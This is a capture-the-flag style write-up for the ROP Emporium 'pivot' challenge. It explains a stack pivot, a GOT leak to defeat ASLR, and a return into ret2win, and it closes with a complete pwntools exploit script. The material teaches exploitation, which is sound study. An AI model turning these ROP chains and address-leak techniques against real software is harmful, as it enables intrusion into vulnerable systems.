# Pivot
This challenge is an introduction to stack pivoting.
Stack pivoting is a useful technique where the stack is moved to a different location by altering the stack pointer.
This can come in useful when there is not enough space for a rop chain on the stack, but you can write to another location in memory.

## The goal
In this challenge, we have to call a `ret2win()` function in a shared object `libpivot`.
This is similar to a return to libc attack, except we need to leak the address of something in the `libpivot` object instead of from libc.
The challenge binary imports the function `foothold_function()` from the `libpivot` object.
The goal will thus be to leak the `.got.plt` entry of the `foothold_function()` somehow, after which we can calculate the offset between `foothold_function()` and `ret2win()` to get the runtime address of `ret2win`.
Once we have done this, we can simply return into `ret2win()`.
To figure out how ROP can be used for such leaks, I took inspiration from the following [article](https://ian.nl/blog/leak-libc-rop).

## The pivot
To reach our goal, we have to use a stack pivot. This is required as the buffer overflow only allows us to read `0x40` bytes into a `0x20` buffer.
This leaves us with only `0x20` bytes of overflow, which is not enough to construct a full chain to execute our plan, especially considering addresses are already 8 bytes.

Luckily, the binary provides us with a large chunk of memory at a different location. When starting the binary, it asks us for input to write to this location, and gives us the address of the data.
We can thus store the largest part of our ROP chain here, and use the small overflow to pivot the stack to this location.

To figure out what gadgets we can use to pivot the stack, I followed the following [article](https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting).
This article describes multiple gadgets we can use to move the stack pointer. The one we have in our binary is `xchg`:
```
$ ropper -f pivot | grep xchg
...
0x00000000004009bd: xchg rsp, rax; ret;
```
We can thus control the stack pointer, as long as we can also control `rax`. Luckily we have plenty of gadgets for this as well, including a simple pop gadget:
```
$ ropper -f pivot | grep rax
...
0x00000000004009bb: pop rax; ret;
```

We can use this in combination with the printed pivot address we got from the binary. Here is the code I created to parse the address from the binary:
```
instructions = io.recvuntil(">")
print("Instructions:\n", instructions)
pivot_addr = int(instructions.split(b"0x")[1].split(b"\n")[0].decode(),16)
print("Pivot addr: ", hex(pivot_addr))
print("Pivot addr encoded: ", p64(pivot_addr))
```
This results in output as follows  (note ASLR is enabled so the address is different each time):
```
Instructions:
 b'pivot by ROP Emporium\nx86_64\n\nCall ret2win() from libpivot\nThe Old Gods kindly bestow upon you a place to pivot: 0x7f8d34c08f10\nSend a ROP chain now and it will land there\n>'
Pivot addr:  0x7f8d34c08f10
Pivot addr encoded:  b'\x10\x8f\xc04\x8d\x7f\x00\x00'
```
Now we have our gadgets and pivot address, we can use the following payload to pivot the stack:
```
xchg_rsp_rax = 0x4009bd
pop_rax      = 0x4009bb

payload  = b"A" * 40
payload += p64(pop_rax)
payload += p64(pivot_addr)
payload += p64(xchg_rsp_rax)
```
Note that in the actual attack, the post-pivot chain is written before this payload is sent, but this order seemed easier for the explaination.

## Leaking the `foothold_function()` post-pivot
At our pivot memory where our new stack will be, we have to write the next part of our exploit.
Remember, our goal was to leak the address of the `foothold_function()`. This address will be in the GOT.
We can leak this address by looking up the address of the `.got` entry of `foothold_function()` in the binary, and printing out the contents of this entry during runtime by calling `puts()`.
This can be done with a `pop rdi` gadget, which luckily we have in our binary as well. This would then look as follows:
```
foothold_got = 0x601040
pop_rdi      = 0x400a33
puts_plt     = 0x4006e0

post_pivot_chain += p64(pop_rdi)
post_pivot_chain += p64(foothold_got)
post_pivot_chain += p64(puts_plt)
```
However, this only works if the `.got` entry of `foothold_function()` is actually populated. 
This only happens when `foothold_function()` is called for the first time, so we have to manually call the function first to populate the table.
We can do this by jumping to the function from the `.plt` entry, so our chain becomes the following:
```
foothold_got = 0x601040
foothold_plt = 0x400720
pop_rdi      = 0x400a33
puts_plt     = 0x4006e0

post_pivot_chain  = p64(foothold_plt)
post_pivot_chain += p64(pop_rdi)
post_pivot_chain += p64(foothold_got)
post_pivot_chain += p64(puts_plt)
```
This now seems to work! We can provide this chain to the provided memory space, and then provide our pivot payload and pivot to this chain.
This successfully prints out some information, containing an address, which is the `.got` entry of `foothold_function()`.

However, we have a problem. The program exits, as it is only programmed to read two inputs and exit afterwards.
We need a way to continue the program after we make it print the address, so we can provide a new payload to return to an address we compute with the leaked address.
Luckily, this can be achieved rather easily. We can simply return to `main()` with out ROP chain.
This makes the program continue with a new prompt for input. The ROP chain is extended to:
```
foothold_got = 0x601040
foothold_plt = 0x400720
pop_rdi      = 0x400a33
puts_plt     = 0x4006e0
main         = 0x400847

post_pivot_chain  = p64(foothold_plt)
post_pivot_chain += p64(pop_rdi)
post_pivot_chain += p64(foothold_got)
post_pivot_chain += p64(puts_plt)
post_pivot_chain += p64(main)
```

## Returning to `ret2win()`
Now we have leaked the runtime address of `foothold_function()`:
```
b' Thank you!\nfoothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\nj\t\xe04\x8d\x7f\npivot by ROP Emporium\nx86_64\n\nCall ret2win() from libpivot\nThe Old Gods kindly bestow upon you a place to pivot: 0x7f8d33c07f10\nSend a ROP chain now and it will land there\n>'
```
I parsed the address as follows:
```
leaked_foothold_addr_str = leak.split(b"libpivot")[1].split(b"\n")[1]
leaked_foothold_addr = u64(leaked_foothold_addr_str+ b"\x00\x00") # 2 bytes padding
```
This adds 2 bytes of padding, as `u64()` needs an 8 byte value, but the address was only 6 bytes.
Now we can simply look up the base addresses of `foothold_function()` and `ret2win()` to calculate the offset between the two:
```
foothold_base_addr = 0x10096a
ret2win_base_addr  = 0x100a81
calculated_offset = ret2win_base_addr - foothold_base_addr # 0x117
```
Now we know the offset, we can use the leaked address and add the offset to compute the runtime address of `ret2win()`.
All we have to do now, is simply overwrite the return pointer with this address to return into `ret2win()` and solve the challenge with a payload as follows:
```
leaked_ret2win_addr = leaked_foothold_addr + calculated_offset

stage2_payload = b"A" * 40
stage2_payload += p64(leaked_ret2win_addr)
```


The full script for this challenge is as follows:
```
#!/usr/bin/env python3

from pwn import *
import subprocess


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
    #    'breakrva 0xoffset',
    #"continue"
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./pivot"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT STARTS HERE
# ===========================================================
io = start()

xchg_rsp_rax = 0x4009bd
pop_rax      = 0x4009bb
pop_rdi      = 0x400a33
main         = 0x400847
puts_plt     = 0x4006e0
foothold_plt = 0x400720
foothold_got = 0x601040

instructions = io.recvuntil(">")
print("Instructions:\n", instructions)
pivot_addr = int(instructions.split(b"0x")[1].split(b"\n")[0].decode(),16)
print("Pivot addr: ", hex(pivot_addr))
print("Pivot addr encoded: ", p64(pivot_addr))

post_pivot_chain  = p64(foothold_plt)
post_pivot_chain += p64(pop_rdi)
post_pivot_chain += p64(foothold_got)
post_pivot_chain += p64(puts_plt)
post_pivot_chain += p64(main)

io.sendline(post_pivot_chain)

payload  = b"A" * 40
payload += p64(pop_rax)
payload += p64(pivot_addr)
payload += p64(xchg_rsp_rax)
print("Stack smash payload length: ", len(payload))

io.sendlineafter(b">", payload)



# Stage 2
# Parse leaked foothold_function address and calculate address of ret2win

foothold_base_addr = 0x10096a
ret2win_base_addr  = 0x100a81

leak = io.recvuntil(b'>')

print("Leaked: ", leak)
leaked_foothold_addr_str = leak.split(b"libpivot")[1].split(b"\n")[1]
leaked_foothold_addr = u64(leaked_foothold_addr_str+ b"\x00\x00") # 2 bytes padding
print("Leaked address: ", hex(leaked_foothold_addr))

calculated_offset = ret2win_base_addr - foothold_base_addr # 0x117
print("Calculated offset: ", hex(calculated_offset))

leaked_ret2win_addr = leaked_foothold_addr + calculated_offset

stage2_payload = b"A" * 40
stage2_payload += p64(leaked_ret2win_addr)

io.sendlineafter(b">", stage2_payload)
io.interactive()
```
